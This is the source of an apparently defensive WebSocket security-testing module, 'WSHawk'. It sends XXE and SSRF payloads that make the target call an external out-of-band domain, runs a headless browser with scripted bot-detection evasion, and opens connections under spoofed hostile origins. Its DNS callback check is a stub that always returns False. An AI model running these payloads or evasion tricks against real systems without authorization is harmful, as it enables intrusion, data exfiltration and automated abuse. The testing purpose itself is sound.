"""
WSHawk Advanced Defensive Validation Modules
============================================

These modules help organizations validate their defensive security controls.

WARNING: ETHICAL USE ONLY
- Only use with explicit written authorization
- These tests validate defensive capabilities
- Designed to help blue teams improve security
- NOT for unauthorized testing

Modules:
1. DNS Exfiltration Prevention Test
2. Bot Detection Validation Test  
3. CSWSH (Cross-Site WebSocket Hijacking) Test
4. WSS Protocol Security Validation Test
"""

import asyncio
import websockets
import uuid
import time
from typing import Dict, List, Optional


class DefensiveValidationModule:
    """Base class for defensive validation tests"""
    
    def __init__(self, target_url: str, oast_domain: str = "oast.me"):
        self.target_url = target_url
        self.oast_domain = oast_domain
        self.findings = []
        
    def add_finding(self, test_name: str, vulnerable: bool, severity: str, 
                   description: str, recommendation: str, cvss: float = 0.0):
        """Add a defensive validation finding"""
        self.findings.append({
            'test': test_name,
            'vulnerable': vulnerable,
            'severity': severity,
            'description': description,
            'recommendation': recommendation,
            'cvss': cvss,
            'timestamp': time.time()
        })


class DNSExfiltrationTest(DefensiveValidationModule):
    """
    DNS Exfiltration Prevention Validator
    
    Tests if the target network properly blocks DNS-based data exfiltration.
    This helps organizations validate their egress filtering policies.
    
    Attack Scenario:
    - Attackers use DNS queries to exfiltrate data
    - Common in APT attacks and malware C2
    - Often bypasses basic firewalls
    
    Defensive Goal:
    - Ensure DNS queries to unknown domains are blocked/monitored
    - Validate egress filtering effectiveness
    - Detect potential data exfiltration channels
    """
    
    def __init__(self, target_url: str, oast_domain: str = "oast.me"):
        super().__init__(target_url, oast_domain)
        self.dns_tests = []
        
    async def test_dns_exfiltration_via_xxe(self, websocket) -> Dict:
        """
        Test DNS exfiltration through XXE vulnerability
        
        Validates if:
        1. XML parser processes external entities
        2. DNS queries reach external servers
        3. Egress filtering blocks DNS tunneling
        """
        test_id = str(uuid.uuid4())[:8]
        test_domain = f"xxe-test-{test_id}.{self.oast_domain}"
        
        # XXE payload that triggers DNS lookup
        xxe_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://{test_domain}/data">
]>
<root>&xxe;</root>'''
        
        payload = {
            "action": "parse_xml",
            "xml": xxe_payload
        }
        
        try:
            await websocket.send(str(payload))
            response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
            
            # Wait for DNS callback
            await asyncio.sleep(3)
            
            # Check if DNS query was received
            dns_received = await self._check_dns_callback(test_domain)
            
            if dns_received:
                self.add_finding(
                    test_name="DNS Exfiltration Prevention",
                    vulnerable=True,
                    severity="HIGH",
                    description=f"DNS-based data exfiltration is possible. "
                               f"External DNS query to {test_domain} was successful.",
                    recommendation="Implement DNS egress filtering. Only allow DNS "
                                 "queries to authorized DNS servers. Monitor for "
                                 "suspicious DNS patterns (long subdomains, high query rates).",
                    cvss=7.5
                )
                return {'vulnerable': True, 'domain': test_domain}
            else:
                self.add_finding(
                    test_name="DNS Exfiltration Prevention",
                    vulnerable=False,
                    severity="INFO",
                    description="DNS egress filtering is properly configured. "
                               "External DNS queries are blocked.",
                    recommendation="Continue monitoring DNS traffic for anomalies."
                )
                return {'vulnerable': False}
                
        except Exception as e:
            return {'error': str(e)}
    
    async def test_dns_exfiltration_via_ssrf(self, websocket) -> Dict:
        """
        Test DNS exfiltration through SSRF vulnerability
        
        Validates if SSRF can be used to trigger DNS lookups
        """
        test_id = str(uuid.uuid4())[:8]
        test_domain = f"ssrf-test-{test_id}.{self.oast_domain}"
        
        payload = {
            "action": "fetch_url",
            "url": f"http://{test_domain}/callback"
        }
        
        try:
            await websocket.send(str(payload))
            await asyncio.wait_for(websocket.recv(), timeout=5.0)
            await asyncio.sleep(3)
            
            dns_received = await self._check_dns_callback(test_domain)
            
            if dns_received:
                self.add_finding(
                    test_name="SSRF-based DNS Exfiltration",
                    vulnerable=True,
                    severity="HIGH",
                    description="SSRF vulnerability allows DNS-based data exfiltration.",
                    recommendation="Implement URL validation and egress filtering. "
                                 "Block access to internal networks and metadata services.",
                    cvss=8.2
                )
                return {'vulnerable': True}
            else:
                return {'vulnerable': False}
                
        except Exception as e:
            return {'error': str(e)}
    
    async def _check_dns_callback(self, domain: str) -> bool:
        """
        Check if DNS callback was received
        
        In production, this would query your OAST server's API
        """
        # Placeholder - integrate with actual OAST provider
        return False
    
    async def run_all_tests(self, websocket) -> List[Dict]:
        """Run all DNS exfiltration tests"""
        results = []
        
        print("[*] Testing DNS Exfiltration Prevention...")
        
        result = await self.test_dns_exfiltration_via_xxe(websocket)
        results.append(result)
        
        result = await self.test_dns_exfiltration_via_ssrf(websocket)
        results.append(result)
        
        return results


class BotDetectionValidator(DefensiveValidationModule):
    """
    Anti-Bot Detection Effectiveness Validator
    
    Tests if anti-bot measures can detect and block automated browsers.
    Helps organizations validate their bot protection effectiveness.
    
    Attack Scenario:
    - Credential stuffing attacks
    - Automated scraping
    - Account takeover attempts
    
    Defensive Goal:
    - Ensure bot detection catches headless browsers
    - Validate anti-automation measures
    - Identify gaps in bot protection
    """
    
    async def test_basic_headless_detection(self) -> Dict:
        """
        Test if basic headless browser is detected
        
        Uses standard Playwright without evasion techniques
        """
        try:
            from playwright.async_api import async_playwright
        except ImportError:
            return {'error': 'Playwright not installed', 'skipped': True}
        
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context()
                page = await context.new_page()
                
                await page.goto(self.target_url.replace('ws://', 'http://').replace('wss://', 'https://'))
                content = await page.content()
                
                blocked_indicators = [
                    'access denied', 'bot detected', 'automated',
                    'captcha', 'cloudflare', 'please verify'
                ]
                
                is_blocked = any(indicator in content.lower() for indicator in blocked_indicators)
                
                await browser.close()
                
                if is_blocked:
                    self.add_finding(
                        test_name="Basic Headless Detection",
                        vulnerable=False,
                        severity="INFO",
                        description="Anti-bot system successfully detected basic headless browser.",
                        recommendation="Continue monitoring for evasion attempts."
                    )
                    return {'detected': True}
                else:
                    self.add_finding(
                        test_name="Basic Headless Detection",
                        vulnerable=True,
                        severity="MEDIUM",
                        description="Anti-bot system failed to detect basic headless browser.",
                        recommendation="Implement or improve bot detection. Consider: "
                                     "navigator.webdriver checks, User-Agent validation, "
                                     "behavioral analysis, commercial bot detection.",
                        cvss=5.3
                    )
                    return {'detected': False}
                    
        except Exception as e:
            return {'error': str(e)}
    
    async def test_evasion_resistance(self) -> Dict:
        """
        Test if anti-bot can detect browsers with evasion techniques
        """
        try:
            from playwright.async_api import async_playwright
        except ImportError:
            return {'error': 'Playwright not installed', 'skipped': True}
        
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context(
                    user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                              'AppleWebKit/537.36 (KHTML, like Gecko) '
                              'Chrome/120.0.0.0 Safari/537.36'
                )
                page = await context.new_page()
                
                # Apply anti-detection measures
                await page.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => false
                    });
                    Object.defineProperty(navigator, 'plugins', {
                        get: () => [1, 2, 3, 4, 5]
                    });
                    Object.defineProperty(navigator, 'languages', {
                        get: () => ['en-US', 'en']
                    });
                """)
                
                await page.goto(self.target_url.replace('ws://', 'http://').replace('wss://', 'https://'))
                content = await page.content()
                
                blocked_indicators = [
                    'access denied', 'bot detected', 'automated',
                    'captcha', 'cloudflare', 'please verify'
                ]
                
                is_blocked = any(indicator in content.lower() for indicator in blocked_indicators)
                
                await browser.close()
                
                if is_blocked:
                    self.add_finding(
                        test_name="Evasion Resistance Test",
                        vulnerable=False,
                        severity="INFO",
                        description="Anti-bot system detected browser even with evasion techniques.",
                        recommendation="Excellent! Continue monitoring and updating detection rules."
                    )
                    return {'evaded': False}
                else:
                    self.add_finding(
                        test_name="Evasion Resistance Test",
                        vulnerable=True,
                        severity="HIGH",
                        description="Anti-bot system failed to detect headless browser with evasion.",
                        recommendation="URGENT: Upgrade bot detection. Consider behavioral analysis, "
                                     "canvas/WebGL fingerprinting, TLS fingerprinting, or commercial services.",
                        cvss=7.8
                    )
                    return {'evaded': True}
                    
        except Exception as e:
            return {'error': str(e)}
    
    async def run_all_tests(self) -> List[Dict]:
        """Run all bot detection validation tests"""
        results = []
        
        print("[*] Validating Bot Detection Effectiveness...")
        
        result = await self.test_basic_headless_detection()
        results.append(result)
        
        if not result.get('detected', False) and not result.get('skipped'):
            result = await self.test_evasion_resistance()
            results.append(result)
        
        return results


class CSWSHValidator(DefensiveValidationModule):
    """
    Cross-Site WebSocket Hijacking (CSWSH) Validator
    
    Tests if WebSocket connections properly validate Origin headers.
    Critical for preventing cross-site attacks.
    
    Attack Scenario:
    - Attacker hosts malicious page
    - Page connects to victim's WebSocket
    - Uses victim's session to perform actions
    
    Defensive Goal:
    - Ensure Origin header is validated
    - Prevent cross-site WebSocket connections
    - Protect user sessions
    """
    
    async def test_origin_validation(self) -> Dict:
        """
        Test if server validates Origin header
        
        Attempts connection with malicious origins
        """
        # Load malicious origins from payload file
        import os
        payload_file = os.path.join(
            os.path.dirname(__file__), 
            'payloads', 
            'malicious_origins.txt'
        )
        
        try:
            with open(payload_file, 'r') as f:
                malicious_origins = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            # Fallback to basic list if file not found
            malicious_origins = [
                'https://evil-attacker.com',
                'http://localhost:666',
                'null'
            ]
        
        vulnerable_origins = []
        
        for origin in malicious_origins:
            try:
                ws = await websockets.connect(
                    self.target_url,
                    extra_headers={'Origin': origin}
                )
                
                vulnerable_origins.append(origin)
                await ws.close()
                
            except Exception:
                pass
        
        if vulnerable_origins:
            self.add_finding(
                test_name="CSWSH - Origin Header Validation",
                vulnerable=True,
                severity="CRITICAL",
                description=f"Server accepts WebSocket connections from untrusted origins: "
                           f"{', '.join(vulnerable_origins)}. CSWSH is possible.",
                recommendation="CRITICAL: Implement Origin header validation immediately. "
                             "Only accept connections from trusted origins.",
                cvss=9.1
            )
            return {'vulnerable': True, 'vulnerable_origins': vulnerable_origins}
        else:
            self.add_finding(
                test_name="CSWSH - Origin Header Validation",
                vulnerable=False,
                severity="INFO",
                description="Server properly validates Origin header. CSWSH attacks are prevented.",
                recommendation="Excellent! Continue enforcing Origin validation."
            )
            return {'vulnerable': False}
    
    async def test_csrf_token_requirement(self) -> Dict:
        """
        Test if WebSocket requires CSRF tokens
        """
        try:
            ws = await websockets.connect(self.target_url)
            
            test_payload = {
                "action": "sensitive_action",
                "data": "test"
            }
            
            await ws.send(str(test_payload))
            response = await asyncio.wait_for(ws.recv(), timeout=5.0)
            
            if 'success' in response.lower():
                self.add_finding(
                    test_name="CSRF Token Requirement",
                    vulnerable=True,
                    severity="HIGH",
                    description="WebSocket accepts sensitive actions without CSRF token.",
                    recommendation="Implement CSRF token validation for WebSocket messages.",
                    cvss=7.5
                )
                return {'vulnerable': True}
            else:
                return {'vulnerable': False}
                
            await ws.close()
            
        except Exception as e:
            return {'error': str(e)}
    
    async def run_all_tests(self) -> List[Dict]:
        """Run all CSWSH validation tests"""
        results = []
        
        print("[*] Testing CSWSH Prevention...")
        
        result = await self.test_origin_validation()
        results.append(result)
        
        result = await self.test_csrf_token_requirement()
        results.append(result)
        
        return results


async def run_defensive_validation(target_url: str):
    """
    Run all defensive validation modules
    
    Helps organizations validate their security controls
    """
    print("=" * 70)
    print("WSHawk Defensive Validation Suite")
    print("=" * 70)
    print()
    print("WARNING: AUTHORIZED TESTING ONLY")
    print("These tests validate defensive security controls.")
    print("Only use with explicit written authorization.")
    print()
    print("=" * 70)
    print()
    
    all_findings = []
    
    # 1. DNS Exfiltration Prevention Test
    try:
        async with websockets.connect(target_url) as ws:
            dns_test = DNSExfiltrationTest(target_url)
            await dns_test.run_all_tests(ws)
            all_findings.extend(dns_test.findings)
    except Exception as e:
        print(f"[!] DNS test error: {e}")
    
    # 2. Bot Detection Validation
    try:
        bot_test = BotDetectionValidator(target_url)
        await bot_test.run_all_tests()
        all_findings.extend(bot_test.findings)
    except Exception as e:
        print(f"[!] Bot detection test error: {e}")
    
    # 3. CSWSH Validation
    try:
        cswsh_test = CSWSHValidator(target_url)
        await cswsh_test.run_all_tests()
        all_findings.extend(cswsh_test.findings)
    except Exception as e:
        print(f"[!] CSWSH test error: {e}")
    
    # 4. WSS Protocol Security Validation (only for wss:// URLs)
    if target_url.startswith('wss://'):
        try:
            from .wss_security_validator import WSSSecurityValidator
            wss_test = WSSSecurityValidator(target_url)
            wss_test.run_all_tests()
            all_findings.extend(wss_test.findings)
        except Exception as e:
            print(f"[!] WSS security test error: {e}")
    else:
        print("[*] Skipping WSS security tests (requires wss:// URL)")
    
    # Print summary
    print("\n" + "=" * 70)
    print("DEFENSIVE VALIDATION SUMMARY")
    print("=" * 70)
    
    critical = sum(1 for f in all_findings if f['severity'] == 'CRITICAL')
    high = sum(1 for f in all_findings if f['severity'] == 'HIGH')
    medium = sum(1 for f in all_findings if f['severity'] == 'MEDIUM')
    
    print(f"\nFindings:")
    print(f"  CRITICAL: {critical}")
    print(f"  HIGH: {high}")
    print(f"  MEDIUM: {medium}")
    print()
    
    for finding in all_findings:
        if finding['vulnerable']:
            print(f"\n[{finding['severity']}] {finding['test']}")
            print(f"  Description: {finding['description']}")
            print(f"  Recommendation: {finding['recommendation']}")
            if finding.get('cvss'):
                print(f"  CVSS: {finding['cvss']}")
    
    return all_findings
